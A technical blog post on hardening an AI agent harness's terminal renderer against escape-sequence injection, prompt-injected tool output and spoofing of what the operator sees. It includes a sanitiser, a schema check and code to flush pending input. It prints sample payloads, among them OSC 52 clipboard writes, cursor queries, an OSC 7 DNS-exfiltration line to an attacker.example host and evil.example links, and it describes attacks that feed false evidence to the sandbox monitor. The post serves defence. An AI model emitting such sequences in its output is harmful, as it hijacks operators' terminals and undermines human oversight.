---
title: Hardening the rich rendering interface
type: dev
code_tag: ch03_ag-dsh/p02_sec-rich-rnd__post_code
code_package: agent_sandbox
slug: improve-sec-rich-rendering-interface
status: draft
tags: [langgraph, agent-sandbox, agent-dashboard, rich, security]
custom_excerpt: "gVisor never sees a byte of what the renderer paints. This post splits the chapter 02 threats into what the sandbox owns and what the rich rendering interface owns — JSON parser, Rich, terminal emulator, operator — shows each open case in the code, and lays out the L6 choke points that close them."
feature_image:
---

## Where this post starts

The [previous post](/rich-rendering-cli-stream-json/) replaced node 6's one-process-per-turn `claude -p` with a persistent stream-json session and a renderer built on Rich. It ended with two cases explicitly open — **T1e** (a terminal query in agent output answered on the operator's stdin) and **T7e** (an unbounded read buffer) — and one sentence that this post takes literally: *Rich does not sanitise escape sequences.*

The [chapter 02 harness post](/minimal-sandbox-exec-langgraph-harness/) scored the sandbox and found L1 real and L2–L7 absent. Nothing in the rich renderer moved the boundary, and nothing about the boundary protects the renderer: `runsc` isolates syscalls at IP-4, while the renderer lives on the other side of IP-3 and paints straight onto IP-1. A byte that is harmless inside the container becomes an instruction the moment something on the host *interprets* it — and the previous post added three new interpreters on the host: a JSON parser, a markup-and-markdown renderer, and, through it, the operator's terminal emulator.

This post is the L6 post for the operator edge that the chapter 02 overview promised: *output sanitisation and scoped approvals at IP-1, a schema-validated channel at IP-3*. It does three things. It sorts the [threat inventory](/agent-sandbox-overview/#threat-inventory-for-agent-sandboxes) into the cases the sandbox owns and the cases the rendering interface owns. It shows each interface case in the code as it stands after post 01, with a probe for the ones that are easy to disbelieve. And it lays out where the defenses go — three choke points, one per direction — before the next section implements them.

<style>
.id-col-table th:first-child,
.id-col-table td:first-child {
  white-space: nowrap;
  width: 1%;
}
</style>

## What the rendering interface is

The block diagram of the previous post has seven links, B-1…B-7. The *rendering interface* is the three of them that carry bytes between the sandbox and the operator, plus the parsers that act on those bytes on the host. The same drawing, with the operator split from the terminal emulator — they are two different interpreters — and every place where a byte from the sandbox is *interpreted* marked V-1…V-7. Hover or click a badge for what acts on the bytes there and which threat cases land on it:

{{island:blocks}}

The three links, as a table:

<div class="id-col-table">

| Link | Direction | Carrier | Interpreter on the host | In the code |
|---|---|---|---|---|
| B-3/B-4 | sandbox → harness | NDJSON events on the exec socket (IP-3) | `json.loads`, the `type` dispatch in `TurnRenderer.feed()` | `container.readline()`, `gateway.send_chat_turn()` |
| B-2 | harness → operator | Rich `Console` → the operator's terminal emulator (IP-1, outbound) | Rich's markup parser, markdown-it-py, Pygments; then the terminal's VT parser; then the operator | `render.py` |
| B-1 | operator → harness | `input()` → `interrupt()` resume (IP-1, inbound) | the harness's own turn logic; the CLI; the model | `main.py`, `gateway.ask_user()` |

</div>

Three things feed it, and all three are attacker-influenceable:

1. **Model text.** Every `text` block. The model is steered by whatever it read — a task description, a fetched page, a README — which is the T9b root the InjecAgent numbers<sup>[2](#ref-2)</sup> put at 24–48% compliance with injected instructions.
2. **Tool results.** Every `tool_result` block. This is the realistic path and it needs no compromised model at all: `cat README.md` on a repository that contains a hidden escape sequence puts that sequence in a `tool result` panel on the operator's terminal. Terminal DiLLMa<sup>[5](#ref-5)</sup> is exactly this — a file with injected content, an LLM CLI that prints it, a terminal that obeys it.
3. **The envelope itself.** The `type` field, `is_error`, `duration_ms`, `num_turns`, `usage`, the tool `name` — all produced by a `claude` binary that lives on a writable rootfs and is resolved on `PATH` inside the container (chapter 02's T5b). A schema on the channel constrains the *shape* of an event; it says nothing about whether the event is true.

The chapter 02 overview's framing applies unchanged: the interface is the sandbox's monitoring layer **M** and, once approvals arrive, its intervention layer **I**. An attack that lands here doesn't leave the sandbox; it makes the sandbox lie to the person watching it.<sup>[1](#ref-1)</sup>

## Sorting the inventory

The rule that separates the two halves is: *which interpreter acts on the bytes.* If it's the kernel, the Sentry, the daemon, the filesystem or the network stack, the case belongs to the sandbox — layers L1–L5 and L7, chapter 02's remaining posts. If it's the harness's parser, the renderer, the terminal emulator, or the operator's perception, it belongs to the rendering interface — L6, this post.

<div class="id-col-table">

| Vector | Cases | Interpreter that acts on the bytes | IP | Owner |
|---|---|---|---|---|
| T1 | T1a–d | network stack, filesystem, credential store | IP-6, IP-5 | sandbox |
| T1 | **T1e** | the operator's terminal emulator, answering on the pty; `input()` | IP-1 | **interface** |
| T2 | T2a–d | package manager inside the container | IP-6, IP-5 | sandbox — with a host-side twin, see [below](#surface-the-interface-adds) |
| T3 | T3a, T3b | kernel / filesystem, remote APIs | IP-5, IP-6 | sandbox |
| T3 | T3c | nothing — a loop; only visible through **M** | IP-3 | sandbox enforces; interface must show it faithfully |
| T4 | T4a–c | network stack | IP-6 | sandbox |
| T5 | T5a–d | filesystem, container lifecycle | IP-5, IP-2 | sandbox |
| T6 | T6a–l | host kernel / Sentry | IP-4 | sandbox |
| T7 | T7a–d | cgroups, Sentry | IP-4 | sandbox |
| T7 | **T7e** | the harness's read buffer, JSON parser and renderer | IP-3 | **interface** |
| T8 | T8a–c | Docker daemon | IP-2 | sandbox |
| T9 | **T9a** | the harness's turn state machine, driven by the envelope | IP-3 | **interface** — the envelope parser |
| T9 | T9b | the orchestrator's relay logic | IP-3 → IP-1 | shared — this harness never relays content as a task; the interface's part is making injected content look like *content* |
| T9 | T9c | the approval gate | IP-1 | shared — enforcement is L6 on the host, but the interface has to carry the request |
| T9 | **T9d** | the terminal emulator's VT parser; Rich's markup parser | IP-1 | **interface** |
| T9 | **T9e** | the operator | IP-1 | **interface** |

</div>

Five cases are the interface's own: **T1e, T7e, T9a, T9d, T9e**. Two are shared and stay on the list to be carried, not closed. Everything else is untouched by this post and by anything that renders — a fact worth stating once, because a hardened renderer is easy to mistake for a hardened sandbox.

## The interface cases in this code

Each of the five, with the path the bytes take after post 01 and the evidence. The probe is Rich 15.0.0 on a `Console(force_terminal=True)` writing to a buffer, so the raw byte stream the terminal would receive is visible.

### T9d — terminal escape injection

The claim in the previous post was that Rich does not sanitise escape sequences. More precisely: `Text.__init__` runs `strip_control_codes()`, which removes exactly five C0 bytes — BEL (7), BS (8), VT (11), FF (12), CR (13) — and nothing else. ESC (27) survives, and so does every CSI, OSC, DCS and APC sequence it introduces, plus the 8-bit C1 controls (`0x80–0x9F`) that some terminals accept as one-byte equivalents.<sup>[6](#ref-6)</sup>

    >>> c.print(Text("A\x1b]52;c;SGVsbG8=\x07B\x1b[6nC\x1b[2JD\rE\x07F"))
    'A\x1b]52;c;SGVsbG8=B\x1b[6nC\x1b[2JDEF\n'

Three paths carry agent bytes to the terminal, and each has its own twist:

<div class="id-col-table">

| Path | Source | Code | What survives |
|---|---|---|---|
| model text | `text` blocks, streamed and final | `_tail()` → `Text`; `_end_text()` / `_assistant()` → `_md()` → `Markdown` | markdown-it-py passes control bytes through as text; `\x1b[2J` in a paragraph reaches the terminal (probed). |
| tool I/O | `tool_use.input`, `tool_result.content` | `Text(body)` inside `Panel` | ESC-sequences intact. The BEL strip has a perverse side effect: an OSC terminated by BEL *loses its terminator*, so the terminal keeps consuming the following text as part of the OSC string until the next ESC — a hide primitive. An attacker uses ST (`ESC \`) instead and the sequence passes whole. |
| tool name | `tool_use.name` | `Panel(title=f"[tool.title]tool · {name}[/]")` | Interpolated into a Rich **markup** string: `[bold red]Bash[/]` restyles the title, `[link=https://evil.example]Read[/link]` emits an OSC 8 hyperlink (probed). The API only returns names from the tool set, but the tool set is defined inside the container — MCP servers from a writable `.mcp.json` — and the envelope is untrusted anyway. |

</div>

The login relay's `_clean` regex (CSI, OSC 8, CR) is the only filter in the harness and it runs on `claude auth login` output and on CLI stderr — never on a turn. Even where it runs it is a denylist: OSC 52, DCS, APC, C1 and the two- and three-byte ESC forms are not in it.

What the terminal then *does* with the sequence is terminal-dependent, and the 2023 survey that found twelve CVEs across iTerm2, mintty, xterm, Windows Terminal and others<sup>[6](#ref-6)</sup> is the reference for how wide the spread is. The stable subset — window title, cursor movement, clear screen, colours, OSC 8 links, OSC 52 clipboard *write* — is enough for every case in the next two sections. The CWE is 150, *Improper Neutralization of Escape, Meta, or Control Sequences*.<sup>[8](#ref-8)</sup>

### T9e — presentation spoofing

Where T9d makes the terminal do something, T9e makes the operator *believe* something. The rendered view diverges from the data in six ways in this code:

<div class="id-col-table">

| # | Path | Evidence |
|---|---|---|
| 1 | **Markdown links hide their target.** Rich's `Markdown` defaults to `hyperlinks=True` and renders `[docs](https://evil.example/x)` as an OSC 8 hyperlink: the terminal shows `docs`, underlined; the URL is in the escape sequence. | `'see \x1b]8;id=…;https://evil.example/x\x1b\\docs\x1b]8;;\x1b\\ here'` (probed). With `hyperlinks=False` the same input renders `docs (https://evil.example/x)`. |
| 2 | **Markup injection in titles.** The tool-name path above: a name can restyle its own panel or attach a link to it. | probed, see T9d |
| 3 | **Forged panels and prompts.** Nothing distinguishes a real `tool result` panel from a `text` block that draws one with box characters, or the harness's own `Your reply (or /quit):` from a model answer that ends with that line and a fake operator reply. The prompt is printed on the same canvas, immediately after the answer. | structural — see [below](#surface-the-interface-adds) |
| 4 | **Envelope fields shown as facts.** The red `· error` title comes from `tool_result.is_error`; the footer's `7.1s · 2 turn(s)` from `duration_ms` and `num_turns`. All are claims by a binary on a writable rootfs. A tampered CLI can show a denied tool as a success, or a tool call that never ran. | `_tool_results()`, `_result()` |
| 5 | **Unicode reordering.** Bidi overrides (U+202E), zero-width characters and homoglyphs pass through every path; a `tool result` showing a diff or a file is the Trojan Source setting<sup>[7](#ref-7)</sup> — source that reads one way and compiles another. Whether the terminal applies bidi is, again, terminal-dependent. | no normalisation anywhere in `render.py` |
| 6 | **Head-only clipping.** `_clip()` keeps the first 1,500 / 1,200 characters of a tool input / result and prints `… (N more chars)`. The dangerous half of a command goes at the end. Under `--permission-mode auto` the classifier, not the operator, decides — but the operator is the monitor, and the monitor sees the harmless half. | `_TOOL_INPUT_MAX`, `_TOOL_RESULT_MAX` |

</div>

In AI-Sandboxes terms every row is an attack on the integrity of **M** as perceived, so that a decision at **I** — the next thing the operator types — is made on forged evidence.<sup>[1](#ref-1)</sup>

### T1e — host-side exfiltration through the operator terminal

The reverse direction. A *query* sequence makes the terminal emulator answer on the pty's input side: `\x1b[6n` (DSR, cursor position), `\x1b[c` (DA, terminal identity), `\x1b]52;c;?\x07` (OSC 52 clipboard *read*, where enabled), XTGETTCAP, the OSC 10/11 colour queries.<sup>[6](#ref-6)</sup> The reply is bytes on stdin, and after post 01 the timing is exact: the renderer prints the sequence *during* the turn, the terminal answers immediately, the bytes wait in the pty's input queue, and the very next read on that queue is `input(f"{prompt}\n> ")` in `main.py`. A DSR reply carries no newline, so it becomes the invisible prefix of whatever the operator types next; `Command(resume=reply)` carries it into `state["transcript"]`, `send_chat_turn()` wraps it in a `user` message, and the model reads it. Host → sandbox, through no channel the sandbox's egress policy will ever see.

Terminal-dependent, as the overview says — most emulators refuse the clipboard read — but two points keep it on the list. First, DSR and DA are answered by *every* terminal; they leak little on their own but prove the channel. Second, some sequences exfiltrate without a reply at all: until macOS 26.1 the Terminal app resolved the hostname in an OSC 7 working-directory URL, so `\x1b]7;file://<data>.attacker.example/\x07` in agent output was a DNS exfiltration — reported through exactly this LLM-CLI path.<sup>[9](#ref-9)</sup>

### T7e — harness exhaustion via the exec channel

The victim is the orchestrator process, where no cgroup applies. Five ways in:

<div class="id-col-table">

| # | Mechanism | Code |
|---|---|---|
| 1 | A line without a newline grows `_stdout` without bound. | `ExecSession.readline()` |
| 2 | A deeply nested JSON line: `json.loads("[" * 100000)` raises **`RecursionError`**, not `JSONDecodeError`. The `except` in `send_chat_turn()` catches only the latter; the harness process dies, the `finally` stops the spinner on the way down, and the session's write side is never closed. | `gateway.send_chat_turn()` (probed) |
| 3 | Rendering cost on the host. A fenced block's language tag selects a Pygments lexer; Pygments has shipped ReDoS lexers before (CVE-2021-27291<sup>[10](#ref-10)</sup>), and `pyproject.toml` pins `rich>=13` — whatever `pip install -e .` resolves on the operator's machine today. Only tool panels are clipped; a text block of any size goes through markdown-it-py and Pygments whole. | `_md()`, `pyproject.toml` |
| 4 | `_tail()` re-splits the entire accumulated text on every `text_delta` — quadratic in the length of a streamed block. | `TurnRenderer._tail()` |
| 5 | After `CHAT_TURN_TIMEOUT` the session is left open with unread events queued. The next `send_chat_turn()` reads *those* first and returns on the first `result` it meets — the previous turn's answer, attributed to the new question. Exhaustion that turns into T9a. | `gateway.send_chat_turn()` |

</div>

### T9a — the envelope as state machine

Post 01 stopped pattern-matching substrings: the loop dispatches on `ev["type"]` and ends the turn on `"result"`. That is a real improvement over chapter 02's `"Paste code here"` markers, and it is still driven from inside the sandbox. A tampered `claude` — or any process that gets hold of the exec socket's stdout — can end a turn early, never end it (timeout, then row 5 above), emit `user` events with `tool_result` panels for tools that never ran, or emit `assistant` text that never came from the API. Schema validation closes the *shape* half of this: unknown types, wrong field types and oversized events are dropped rather than dispatched. The *truth* half cannot be closed on this channel at all; it is closed by never letting envelope fields drive host-side decisions, and by presenting them as what they are — reported by the CLI.

## One poisoned turn, step by step

The cases above are five entries in a table; in a real run they are one turn. The operator asks for a README summary. The README contains three things a text file has no business containing: an OSC 52 clipboard write terminated with ST, a DSR cursor query, and a Markdown link whose text says `docs` and whose target doesn't. No prompt is injected and the model does nothing wrong — it reads the file it was asked to read. Steps A-1…A-10 are the post-01 code, unchanged:

{{island:flow}}

Read A-4, A-5 and A-9 together: the renderer writes the sequence, the terminal answers it on the pty *during* the turn, and the answer is the first thing `input()` reads afterwards. Three components, each doing exactly what it is for, and between them a channel from the operator's machine into the sandbox that no egress policy is positioned to see. A-6 and A-7 are the other half: what the operator sees while it happens is a clean panel and an underlined word.

## Surface the interface adds

Two things the chapter 02 inventory does not have an ID for, because the naive harness didn't have them:

- **Host-side parsers as a dependency.** The renderer is the first component that runs attacker-controlled input through third-party parsing code *on the operator's machine*: Rich's markup parser, markdown-it-py, Pygments' lexers. That is T2d — unpinned resolution — on the host, where the sandbox's L4 mirror does nothing, and it is the T7e row 3 above. It is closed by a lockfile and a pinned version, not by anything in `render.py`.
- **The shared canvas.** T9e row 3 is not a bug in Rich. The agent's output, the harness's status messages and the operator's prompt are painted on one surface with one set of glyphs; the terminal has no notion of *who wrote a line*. Sanitisation shrinks what the agent can draw; it cannot give the harness a region the agent can't reach. That is a structural property, and it is the one this chapter's dashboard exists to change — a UI with separate regions for agent output, harness state and operator input. The sanitiser is still needed there: the same strings will be rendered in a browser, where T9d's sibling is called XSS.

## Where the defenses go

L6 at three choke points, one per direction of the interface. The principle from the terminal-security literature<sup>[6](#ref-6)</sup> is the one to follow: the safe way to print unknown text is to print only what is printable, and to make what was removed *visible* rather than silently gone — an operator who sees `␛[2J` knows the agent tried something; an operator who sees nothing doesn't.

The block diagram again, with the choke points C-1…C-6 in place of the interpreters. The host outline changes colour; the container does not — it is the untrusted source before and after, and the terminal emulator (C-6) is exactly as obedient as it was. What changed is what reaches it:

<!--kg-card-begin: html-->
<div id="blocks-fix"></div>
<!--kg-card-end: html-->

<div class="id-col-table">

| Choke point | Where | Mechanism | Closes |
|---|---|---|---|
| **IP-3 ingress** | `container.readline()`, `gateway.send_chat_turn()` | Maximum line length — over it, the session is closed and the turn fails. `json.loads` guarded against `RecursionError` (or a depth cap). An event schema: known `type` values, required fields with the expected types, everything else dropped. After a timeout, drain the queue and reset the session instead of leaving it. | T7e rows 1, 2, 5; T9a (shape) |
| **IP-1 egress** | `render.py` — one `sanitize()` through which *every* string extracted from an event passes before it reaches Rich | Parse and remove ESC-introduced sequences (CSI, OSC to BEL or ST, DCS/SOS/PM/APC, 2- and 3-byte ESC forms), all C0 except `\n` and `\t`, and C1 `0x80–0x9F`; replace each with a visible marker. Strip or mark bidi controls and zero-width characters. `rich.markup.escape()` on anything interpolated into a markup string — the tool name first. `Markdown(…, hyperlinks=False)` so every link shows its URL. A size cap on text blocks; head *and* tail on clipped tool I/O. | T9d; T9e rows 1, 2, 5, 6; the query half of T1e |
| **IP-1 ingress** | `main.py` before `input()` | Flush pending tty input (`termios.tcflush(fd, TCIFLUSH)`) so nothing the terminal answered during the turn becomes the prefix of the operator's line; reject a reply that contains ESC or C1. | the reply half of T1e |
| **Envelope trust** | `render.py`, `n06_exchange` | Metadata rendered as reported, never as verified; no host-side state transition on `is_error` or any other envelope field beyond "the turn ended". | T9a (truth) — mitigated, not closed |

</div>

The same poisoned turn, with the choke points in place. Same README, same tool call, same model; steps F-1…F-7 are where the run now diverges from A-4 onwards:

<!--kg-card-begin: html-->
<div id="flow-fix"></div>
<!--kg-card-end: html-->

The turn ends with the operator having *seen* the attempt (F-3) — which is the difference between a sanitiser that deletes and one that marks — and with the model receiving nothing but what the operator typed (F-7). The T1e path needs two things to happen, a query that reaches the terminal and a reply that reaches `input()`, and the two choke points C-2 and C-1 each remove one of them independently; either alone would close it, both together mean one bug does not reopen it.

Left open by design, and said so: T9e row 3 (structural — the dashboard), T9b and T9c (carried, not closed — the approval gate needs a channel the CLI does not offer under `--permission-prompts none`), and T2d on the host (a lockfile, a one-line fix outside the renderer). None of the sandbox-owned cases move.

## What changed

<div class="id-col-table">

| File | Change |
|---|---|
| `services/sanitize.py` | **new** — `sanitize()`: a state machine over the control grammar (CSI, the five string sequences to BEL *or* ST, the Fp/Fs and nF forms, the 8-bit C1 introducers); every control and format character becomes a visible marker; `has_control()` for the reply check |
| `services/render.py` | every string out of an event through `sanitize()`; `escape()` on the tool name before it enters the panel title; `Markdown(hyperlinks=False)`; text blocks bounded while streaming and on print; `_clip()` keeps head *and* tail; envelope fields coerced and labelled *as reported* |
| `services/container.py` | `LineTooLong` from `readline()` / `read_until()` past `CHAT_MAX_LINE`, and from `_demux()` on a frame header announcing more |
| `services/gateway.py` | `_parse_event()`: `RecursionError` caught with `JSONDecodeError`; event schema (`_EVENT_SCHEMA`, `valid_event()`), non-conforming events dropped and counted; session closed on timeout, on `LineTooLong` and on EOF so the next turn starts a fresh process |
| `main.py` | `read_reply()`: `termios.tcflush(TCIFLUSH)` before every `input()`; a reply with control or format characters is shown neutralised and asked again |
| `config.py` | `CHAT_MAX_LINE` (1 MiB), `CHAT_MAX_TEXT_BLOCK` (20,000 chars) |
| `pyproject.toml`, `requirements-lock.txt` | `rich==15.0.0`, `markdown-it-py==4.2.0`, `Pygments==2.21.0`; the full resolved tree as a lockfile |
| `tests/` | 42 tests: the T9d probe, both terminators, C1, the Fs/nF forms, bidi, links, clipping, the schema, the line cap, the reply check |

</div>

## The code

### `sanitize.py` — a parser, not a denylist

The login relay's `_clean` regex is the shape most harnesses reach for: a list of patterns that look like escape sequences. It is wrong in three places that matter here, and each is a property of the grammar rather than a missing pattern. A string sequence (OSC, DCS, SOS, PM, APC) may end in BEL *or* in ST (`ESC \`) — a regex that knows one terminator lets the other form through whole. The C1 bytes `0x9B`, `0x9D`, `0x90`, `0x98`, `0x9E`, `0x9F` and `0x9C` are the same introducers and terminator as one byte each, and the two- and three-byte ESC forms (`ESC c` resets the terminal, `ESC ( B` selects a character set) have no `[` or `]` in them at all.<sup>[4](#ref-4)</sup> So the sanitiser walks the text with a small state machine that knows where each kind of sequence *ends*:

```python
def _seq_end(s: str, i: int) -> int:
    """`s[i]` is ESC or a C1 introducer. Return the index just past the sequence
    it starts; `i + 1` if the ESC is alone at the end of the text."""
    n = len(s)
    ch = s[i]
    if ch == ESC:
        if i + 1 >= n:
            return i + 1
        kind = s[i + 1]
        j = i + 2
    else:
        kind = _C1_INTRO[ch]
        j = i + 1

    if kind == "[":                                   # CSI: params, intermediates, final
        while j < n and 0x30 <= ord(s[j]) <= 0x3F:
            j += 1
        while j < n and 0x20 <= ord(s[j]) <= 0x2F:
            j += 1
        return j + 1 if j < n and 0x40 <= ord(s[j]) <= 0x7E else j

    if kind in _STRING_INTRO:                         # OSC/DCS/SOS/PM/APC: to BEL or ST
        while j < n:
            c = s[j]
            if c == "\x07" or c == _ST:
                return j + 1
            if c == ESC:
                return j + 2 if j + 1 < n and s[j + 1] == "\\" else j   # ST, or a new ESC
            j += 1
        return j                                      # unterminated: runs to the end

    if 0x20 <= ord(kind) <= 0x2F:                     # nF: intermediates then final
        while j < n and 0x20 <= ord(s[j]) <= 0x2F:
            j += 1
        return j + 1 if j < n and 0x30 <= ord(s[j]) <= 0x7E else j

    return j                                          # Fp/Fs/Fe: ESC + one byte
```

Knowing the extent is what lets the output be honest instead of empty. Nothing is deleted: the introducer becomes its control picture (`\x1b` → `␛`, an 8-bit `0x9B` → `␛[`), the body of the sequence stays on screen after it — clipped at 48 characters, so an OSC 52 payload does not fill the panel — and every other control or format character becomes a marker on its own:

```python
def sanitize(text: str, *, seq_show_max: int = SEQ_SHOW_MAX) -> str:
    """Return `text` with every control sequence and control/format character
    replaced by a visible marker. `\\n` and `\\t` are kept; `\\r\\n` becomes `\\n`."""
    if not text:
        return ""
    text = text.replace("\r\n", "\n")
    out: list[str] = []
    i, n = 0, len(text)
    while i < n:
        ch = text[i]
        if ch == ESC or ch in _C1_INTRO:
            end = _seq_end(text, i)
            body = _mark_chars(text[i + 1:end])
            if len(body) > seq_show_max:
                body = body[:seq_show_max] + f"…({len(body) - seq_show_max} more)"
            out.append(_picture(ch) + body)
            i = end
        elif _is_control(ch):
            out.append(_picture(ch))
            i += 1
        else:
            out.append(ch)
            i += 1
    return "".join(out)
```

`_is_control()` is the allowlist: `\n` and `\t` pass; every other C0 byte, DEL, the C1 range and every Unicode format character (category `Cf`) is marked — the bidi controls of Trojan Source,<sup>[7](#ref-7)</sup> zero-width space, the BOM, the tag block `U+E0000–E007F` that ASCII-smuggling attacks use. Three `Cf` characters are let through because text needs them: ZWNJ and ZWJ (emoji sequences, Indic and Persian scripts) and the soft hyphen. The T9d probe from above, after:

    >>> sanitize("A\x1b]52;c;SGVsbG8=\x07B\x1b[6nC\x1b[2JD\rE\x07F")
    'A␛]52;c;SGVsbG8=␇B␛[6nC␛[2JD␍E␇F'

Rich's `Text` no longer has anything to strip, and the terminal receives eleven printable characters where it received a clipboard write, a query and a clear-screen.

### `gateway.py` — schema, guarded loads, reset

The exec channel gets a shape check before dispatch. The spec is a dictionary of the fields the renderer reads, each with its type and whether it is required; `_conforms()` walks it recursively, treating a tuple as *any of* and a one-element list as *a list of*:

```python
_BLOCK = {"type": (str, True), "text": (str, False), "name": (str, False),
          "content": ((str, list), False), "is_error": (bool, False)}
_MESSAGE = {"content": ((str, [_BLOCK]), False)}
_EVENT_SCHEMA = {
    "system": {},
    "stream_event": {"event": ({"type": (str, True),
                                "content_block": ({"type": (str, True), "name": (str, False)}, False),
                                "delta": ({"type": (str, True), "text": (str, False)}, False)}, True)},
    "assistant": {"message": (_MESSAGE, True)},
    "user": {"message": (_MESSAGE, True)},
    "result": {"result": (_STR_OR_NONE, False), "is_error": (bool, False),
               "duration_ms": ((int, float), False), "num_turns": (int, False)},
}


def _parse_event(line: str) -> dict | None:
    """One NDJSON line → a conforming event, or None. `json.loads` on a deeply nested
    line raises RecursionError, not JSONDecodeError; both mean 'drop the line'."""
    try:
        ev = json.loads(line)
    except (json.JSONDecodeError, RecursionError, ValueError):
        return None
    return ev if valid_event(ev) else None
```

`bool` is a subclass of `int` in Python, so `num_turns: true` would pass a naive `isinstance`; `_conforms()` refuses it. An event that fails is not an error — it is counted on the renderer (`r.dropped`) and announced in the footer, because a CLI that emits malformed events is itself a finding.

The turn loop changes in one principle: any failure of the channel itself closes the session. `readline()` raising `LineTooLong`, EOF, and the timeout all end in `ct.close_session(c)`, and node 6 opens a fresh process on its next pass. The old code left a timed-out session open, so the previous turn's queued `result` became the next question's answer (T7e row 5 → T9a); now the queue dies with the process. The price is the CLI's in-process conversation history — after a reset, the agent starts the next turn without it. That is the correct trade: the alternative is to keep reading from a channel that has already failed once.

### `render.py` — one function in front of Rich

Every string that comes out of an event passes `sanitize()` on its way to a Rich object, and the three places where post 01 had a specific gap each get their specific fix:

```python
def _md(text: str) -> Markdown:
    # hyperlinks=False: a link shows as `text (url)` instead of an OSC 8 sequence
    # whose target only the terminal knows. The block is sanitised and bounded
    # before markdown-it-py and Pygments run on it.
    return Markdown(_clip(sanitize(text), config.CHAT_MAX_TEXT_BLOCK), hyperlinks=False,
                    code_theme="ansi_dark", inline_code_theme="ansi_dark")


def _clip(s: str, n: int) -> str:
    """Bound `s` to about `n` chars keeping the head *and* the tail: the half of a
    command that matters is as likely at the end as at the start."""
    if len(s) <= n:
        return s
    head, tail = n * 2 // 3, n // 3
    return f"{s[:head]}\n… ({len(s) - head - tail} chars omitted) …\n{s[-tail:]}"
```

The tool name is the markup case: it is interpolated into a `Panel` *title*, and Rich parses titles as markup. `_tool_name()` sanitises and bounds it to one line, and the call site wraps it in `rich.markup.escape()`<sup>[13](#ref-13)</sup> — so `[link=https://evil.example]Read[/link]` is printed as those characters, in the title, where the operator can see what the tool set contains:

```python
                console.print(Panel(Text(body, style="tool.body"),
                                    title=f"[tool.title]tool · {escape(_tool_name(b.get('name')))}[/]",
                                    border_style="tool.border", expand=False))
```

Streaming is bounded at the source. `_append()` keeps the first `CHAT_MAX_TEXT_BLOCK` characters of a block and counts the rest, so `_tail()` — now an `rsplit` with a limit, walking back only as many newlines as the screen has rows — and the final `Markdown` pass both work on a string whose size the model does not control. The `tool result · error` title becomes `tool result · error (reported)`, the footer reads `4.2s · 2 turn(s) — as reported by the cli`, and a `duration_ms` that arrives as a string renders as `?s` rather than as a traceback.

The poisoned turn from the sequence diagram, rendered through the new code with Rich's own colour codes stripped for readability:

    ╭─ tool · [link=https://evil.example]Read[/link] ─╮
    │ {                                               │
    │   "file_path": "README.md"                      │
    │ }                                               │
    ╰─────────────────────────────────────────────────╯
    ╭─────── tool result ────────╮
    │ # Project␛]52;c;SGVsbG8=␛\ │
    │ Run it.␛[6n␛[2J            │
    ╰────────────────────────────╯
    Summary: see docs (https://evil.example/x) for details.
    4.2s · 2 turn(s) — as reported by the cli

Three attempts, all visible, none executed: the clipboard write and the cursor query are glyphs inside the panel, the link carries its target, and the tool name shows the markup it tried to be. That output is what F-3 in the diagram means.

### `main.py` — the reply half

The renderer no longer prints queries, so the terminal no longer answers them; `main.py` closes the path anyway, because one bug in the sanitiser must not reopen T1e:

```python
def _flush_stdin() -> None:
    """Discard whatever is queued on the tty before we read the operator's line.
    ..."""
    try:
        import termios
        if sys.stdin.isatty():
            termios.tcflush(sys.stdin.fileno(), termios.TCIFLUSH)
    except (ImportError, OSError, ValueError):
        pass


def read_reply(prompt: str) -> str:
    """One operator line: flushed before, checked after. A line with ESC, C0/C1 or
    format characters is not an operator's — it is a terminal's reply to a query,
    or a paste of one — so it is shown neutralised and asked again."""
    while True:
        _flush_stdin()
        reply = input(f"{prompt}\n> ")
        if not has_control(reply):
            return reply
        print(f"[harness] reply held control characters and was dropped: {sanitize(reply)}")
```

`TCIFLUSH` discards the pty's input queue: a DSR or DA reply that arrived during the turn is gone before `input()` starts reading. The cost is type-ahead — a line the operator started typing while the agent was still working is discarded with it — which for a harness whose whole point is that the operator reads before deciding is the right side of the trade. The check after covers the case the flush cannot: a reply that arrives *while* `input()` is reading, or a paste. It is shown back with the markers, so the operator sees `␛[24;80R` prefixed to what they typed and knows the terminal answered something.

## Scorecard

Re-running the chapter 02 list for the five interface cases. The *before* column is post 01; the *after* column is this post.

<div class="id-col-table">

| Case | Before (post 01) | After |
|---|---|---|
| T1e | open — queries reach the terminal, replies reach `input()` | **closed twice** — no query sequence reaches the terminal (`sanitize()`), and no queued reply reaches the model (`tcflush`, `has_control`); OSC 7-style no-reply exfiltration is closed by the first alone |
| T7e | open — unbounded `_stdout`, `RecursionError` uncaught, unclipped text blocks, stale queue after timeout | **closed** — `CHAT_MAX_LINE` on lines and frames; `RecursionError` caught; text blocks bounded while streaming and on print; the session is reset on timeout. Rendering cost per block is bounded by the caps and the pinned parsers; a ReDoS in a *future* Pygments lexer is what the lockfile is for |
| T9a | partial — `type` dispatch instead of substrings; envelope unvalidated and trusted | **shape closed, truth mitigated** — non-conforming events are dropped and counted; `is_error`, `duration_ms`, `num_turns` are shown as *reported* and drive no host-side decision; a tampered CLI can still end a turn early or late, and still claim a tool ran |
| T9d | open — ESC passes `Text`, `Markdown` and `Panel`; tool name is markup | **closed** — every C0, C1, ESC-introduced sequence and format character is a printable marker before Rich; the tool name is escaped as markup |
| T9e | open — OSC 8 links, markup titles, forged panels, envelope metadata, bidi, head-only clipping | **rows 1, 2, 5, 6 closed; 4 mitigated; 3 open** — links show their URL, titles are escaped, bidi and zero-width characters are marked, clipping keeps both ends, envelope fields are labelled as claims. Row 3, a forged panel or a fake `Your reply` prompt drawn with ordinary glyphs, is the shared canvas — the dashboard's problem, not the sanitiser's |

</div>

## References

| ID | Title | Link | Finding |
|----|-------|------|---------|
| <a id="ref-1"></a>1 | AI Sandboxes: A Threat Model, Taxonomy, and Measurement Framework | [arxiv.org/abs/2606.18532](https://arxiv.org/abs/2606.18532) | The monitoring (M) and intervention (I) layers are attack targets in their own right; a sandbox whose monitor is fed by the thing it monitors has no independent evidence. |
| <a id="ref-2"></a>2 | InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated Large Language Model Agents | [arxiv.org/abs/2403.02691](https://arxiv.org/abs/2403.02691) | Agents follow instructions embedded in tool output 24–48% of the time — the reason model text and tool results are treated as attacker-influenceable. |
| <a id="ref-3"></a>3 | OWASP Top 10 for LLM Applications (LLM08 — Excessive Agency) | [genai.owasp.org/llmrisk2023-24/llm08-excessive-agency](https://genai.owasp.org/llmrisk2023-24/llm08-excessive-agency/) | Authorization belongs in downstream systems, not in the LLM's output — here, the harness must not let the envelope decide. |
